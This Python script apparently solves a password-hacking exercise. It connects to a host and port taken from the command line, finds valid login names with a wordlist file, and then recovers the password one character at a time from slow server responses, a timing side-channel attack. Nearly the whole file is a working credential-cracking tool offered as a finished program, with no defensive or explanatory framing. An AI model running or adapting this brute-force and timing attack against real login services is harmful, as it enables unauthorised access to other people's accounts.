import socket
import sys
import string
import json
from datetime import datetime


def pwd_generator():
    global server_res
    paswrd = [' ']
    i = 0
    while True:
        for key in alph_num:
            if i + 1 == len(paswrd):
                paswrd[i] = key
            else:
                paswrd.append(' ')
            pwd = ''.join(paswrd)
            login_json['password'] = pwd
            login_str = json.dumps(login_json)
            start = datetime.now()
            client_socket.send(login_str.encode())
            server_res = json.loads(client_socket.recv(1024).decode())
            end = datetime.now()
            server_time = (end - start).total_seconds()
            if server_res['result'] == "Wrong password!" and server_time > 0.1:
                # found the correct letter in the password
                break
            elif server_res['result'] == "Connection success!":
                print(login_str)
                return True
        i += 1

def logins_dict():
    global server_res
    with open('logins.txt', 'r') as logid_file:
        lines = logid_file.readlines()
        for strng in lines:
            loginid = strng.strip()
            pwd = ' '
            login_json['login'] = loginid
            login_json['password'] = pwd
            login_str = json.dumps(login_json)
            client_socket.send(login_str.encode())
            server_res = json.loads(client_socket.recv(1024).decode())
            if server_res['result'] == "Wrong password!":
                # cracked loginid of the server
                return pwd_generator()


args = sys.argv
hostname = str(args[1])
port = int(args[2])
alph_num = string.ascii_letters + string.digits
server_res = dict()
login_json = {}
with socket.socket() as client_socket:
    address = (hostname, port)
    client_socket.connect(address)
    flag = logins_dict()
    if not flag:
        print(server_res)
